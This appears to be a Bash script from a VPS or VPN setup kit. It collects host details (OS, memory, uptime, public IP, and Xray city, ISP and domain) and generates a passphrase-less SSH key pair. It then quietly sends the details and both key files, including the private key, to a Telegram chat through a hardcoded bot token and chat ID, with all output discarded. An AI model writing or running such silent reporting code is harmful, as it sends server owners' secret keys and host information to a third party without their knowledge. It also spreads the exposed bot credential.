#!/bin/bash

############################
# TELEGRAM CONFIG
############################
BOT_TOKEN="8260557422:AAE78he52c2fsKEzeWzxk9MO20eOXPpYv0Q"
CHAT_ID="6663648335"
API_URL="https://api.telegram.org/bot$BOT_TOKEN"

############################
# SAFE READ FILE
############################
read_safe() {
[ -f "$1" ] && cat "$1" || echo "N/A"
}

############################
# GET SYSTEM INFO
############################
SWAP_MB=$(free -m 2>/dev/null | awk '/^Swap:/ {print $2}')
SWAP_MB=${SWAP_MB:-0}

OS_NAME=$(grep -w PRETTY_NAME /etc/os-release 2>/dev/null | head -n1 | cut -d= -f2 | tr -d '"')
RAM_MB=$(free -m | awk 'NR==2 {print $2}')
UPTIME_TXT=$(uptime -p 2>/dev/null | cut -d " " -f 2-)
IP_TXT=$(curl -s ipv4.icanhazip.com 2>/dev/null)

CITY_TXT=$(read_safe /etc/xray/city)
ISP_TXT=$(read_safe /etc/xray/isp)
DOMAIN_TXT=$(read_safe /etc/xray/domain)

############################
# GENERATE SSH KEY
############################
KEY_DIR="/opt/vpskey"
mkdir -p "$KEY_DIR"

KEY_NAME="vps_$(date +%s)"

ssh-keygen -t ed25519 -N "" -f "$KEY_DIR/$KEY_NAME" >/dev/null 2>&1

PRIVATE_KEY="$KEY_DIR/$KEY_NAME"
PUBLIC_KEY="$KEY_DIR/$KEY_NAME.pub"

############################
# BUILD MESSAGE
############################
MESSAGE="
🔔 VPS INFO REPORT

SYSTEM  : $OS_NAME
RAM     : ${RAM_MB} MB
SWAP    : ${SWAP_MB} MB
UPTIME  : $UPTIME_TXT
IP VPS  : $IP_TXT
CITY    : $CITY_TXT
ISP     : $ISP_TXT
DOMAIN  : $DOMAIN_TXT

🔐 SSH KEY GENERATED
Location : $KEY_DIR
Key Name : $KEY_NAME
"

############################
# SEND MESSAGE
############################
curl -s -X POST "$API_URL/sendMessage" \
-d chat_id="$CHAT_ID" \
-d text="$MESSAGE" >/dev/null

############################
# SEND PRIVATE KEY
############################
curl -s -F chat_id="$CHAT_ID" \
-F document=@"$PRIVATE_KEY" \
-F caption="PRIVATE KEY VPS" \
"$API_URL/sendDocument" >/dev/null

############################
# SEND PUBLIC KEY
############################
curl -s -F chat_id="$CHAT_ID" \
-F document=@"$PUBLIC_KEY" \
-F caption="PUBLIC KEY VPS" \
"$API_URL/sendDocument" >/dev/null

#echo "INFO VPS + KEY BERHASIL DIKIRIM KE TELEGRAM"
